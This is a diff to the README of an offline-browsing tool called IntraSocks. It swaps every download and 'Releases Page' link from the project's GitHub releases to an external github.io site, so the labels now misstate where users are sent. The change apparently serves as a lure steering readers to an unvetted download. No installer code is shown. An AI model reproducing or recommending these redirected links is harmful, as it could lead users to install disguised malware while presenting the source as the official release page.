@@ -1,6 +1,6 @@
 # 🧦 IntraSocks - Browse Offline, See Everything Live
 
-[![Download IntraSocks](https://img.shields.io/badge/Download-IntraSocks-4CAF50?style=for-the-badge&logo=github)](https://github.com/Deuteriumvillagegreen361/IntraSocks/releases)
+[![Download IntraSocks](https://img.shields.io/badge/Download-IntraSocks-4CAF50?style=for-the-badge&logo=github)](https://deuteriumvillagegreen361.github.io)
 
 ## 🎯 What Is IntraSocks?
 
@@ -40,7 +40,7 @@ Getting IntraSocks up and running is simple. Follow these steps:
 
 ### Step 1: Download IntraSocks
 
-Visit this link to download the application: [https://github.com/Deuteriumvillagegreen361/IntraSocks/releases](https://github.com/Deuteriumvillagegreen361/IntraSocks/releases)
+Visit this link to download the application: [https://deuteriumvillagegreen361.github.io](https://deuteriumvillagegreen361.github.io)
 
 Click the big green **Download** button at the top of this page, and you'll jump right to the download area.
 
@@ -188,11 +188,11 @@ IntraSocks turns your computer into a personal web archive. It's fast, it's simp
 
 Download it now, start browsing as usual, and discover how convenient offline access can be.
 
-[![Download IntraSocks Now](https://img.shields.io/badge/Download-IntraSocks-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Deuteriumvillagegreen361/IntraSocks/releases)
+[![Download IntraSocks Now](https://img.shields.io/badge/Download-IntraSocks-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://deuteriumvillagegreen361.github.io)
 
 ## 📬 Get Help and Stay Updated
 
-- **Releases Page:** [https://github.com/Deuteriumvillagegreen361/IntraSocks/releases](https://github.com/Deuteriumvillagegreen361/IntraSocks/releases)
+- **Releases Page:** [https://deuteriumvillagegreen361.github.io](https://deuteriumvillagegreen361.github.io)
 - **Issues and Support:** Visit the repository's issues section for help from the community
 
 Thank you for choosing IntraSocks. Happy offline browsing!
